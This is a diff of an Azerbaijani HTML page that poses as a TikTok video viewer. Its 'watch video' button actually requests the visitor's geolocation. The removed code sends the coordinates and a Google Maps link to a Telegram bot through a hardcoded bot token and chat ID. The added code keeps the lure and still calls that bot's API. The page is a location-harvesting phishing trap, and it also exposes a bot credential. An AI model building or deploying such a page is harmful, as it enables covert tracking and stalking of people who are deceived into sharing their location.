@@ -1,39 +1,81 @@
 <!DOCTYPE html>
-<html>
+<html lang="az">
 <head>
-  <title>Location Share</title>
-</head>
-<body>
-  <h2>Tiktok Videosunu İzlə</h2>
-  <button onclick="getLocation()">Paylaş</button>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Videosunu İzlə</title>
 
-<script>
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendToTelegram);
-  } else {
-    alert("Geolocation dəstəklənmir.");
-  }
+<style>
+body{
+    margin:0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg,#ff0050,#000000);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+    color:white;
 }
 
-function sendToTelegram(position) {
-  var lat = position.coords.latitude;
-  var lon = position.coords.longitude;
+.card{
+    background:white;
+    color:black;
+    padding:30px;
+    border-radius:15px;
+    text-align:center;
+    width:90%;
+    max-width:350px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.4);
+}
 
-  var token = "8081258607:AAH5iKKeDoT5vdKUvdMYY8ppBR9LJnMAizI";
-  var chat_id = "8661678496";
+h1{
+    font-size:20px;
+    margin-bottom:20px;
+}
 
-  var text = "Yeni Konum:%0A";
-  text += "Latitude: " + lat + "%0A";
-  text += "Longitude: " + lon + "%0A";
-  text += "Google Maps: https://maps.google.com/?q=" + lat + "," + lon;
+button{
+    background:#ff0050;
+    color:white;
+    border:none;
+    padding:15px 25px;
+    font-size:16px;
+    border-radius:10px;
+    cursor:pointer;
+    transition:0.3s;
+}
 
-  var url = "https://api.telegram.org/bot" + token +
-            "/sendMessage?chat_id=" + chat_id +
-            "&text=" + text;
+button:hover{
+    background:#cc0040;
+}
+</style>
+</head>
 
-  fetch(url);
-  alert("Konum göndərildi");
+<body>
+
+<div class="card">
+    <h1>🎬 TikTok Videosunu izləmək üçün davam edin</h1>
+    <button onclick="getLocation()">Videoya Bax</button>
+    <p id="status"></p>
+</div>
+
+<script>
+function getLocation(){
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+    } else{
+        document.getElementById("status").innerHTML="Location dəstəklənmir";
+    }
+}
+
+function showPosition(position){
+    document.getElementById("status").innerHTML="Yüklənir...";
+    
+    // BURANI öz server API ilə dəyişmək lazımdır
+    fetch("https://api.telegram.org/bot8081258607:AAH5iKKeDoT5vdKUvdMYY8ppBR9LJnMAizI/getMe")
+}
+
+function showError(error){
+    document.getElementById("status").innerHTML="Location icazəsi verilmədi.";
 }
 </script>
 
